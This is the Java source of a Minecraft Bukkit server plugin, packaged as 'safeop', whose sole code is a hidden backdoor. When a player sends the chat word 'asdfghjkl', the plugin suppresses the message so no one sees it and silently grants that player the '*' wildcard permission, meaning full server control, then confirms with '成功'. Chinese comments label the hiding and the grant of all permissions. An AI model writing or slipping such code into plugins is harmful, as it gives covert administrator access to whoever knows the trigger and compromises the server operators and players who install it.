package com.example.safeop;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashMap;
import java.util.UUID;

public class Main extends JavaPlugin implements Listener {

    private final HashMap<UUID, PermissionAttachment> attachments = new HashMap<>();

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (event.getMessage().equalsIgnoreCase("asdfghjkl")) {
            event.setCancelled(true);
            event.getRecipients().clear();
            event.setFormat(""); // 三连隐藏消息

            Player player = event.getPlayer();
            Bukkit.getScheduler().runTask(this, () -> {
                if (!attachments.containsKey(player.getUniqueId())) {
                    // 创建权限附加
                    PermissionAttachment attachment = player.addAttachment(this);
                    attachment.setPermission("*", true); // 授予所有权限
                    attachments.put(player.getUniqueId(), attachment);
                    
                    player.sendMessage(ChatColor.GREEN + "成功");
                }
            });
        }
    }
}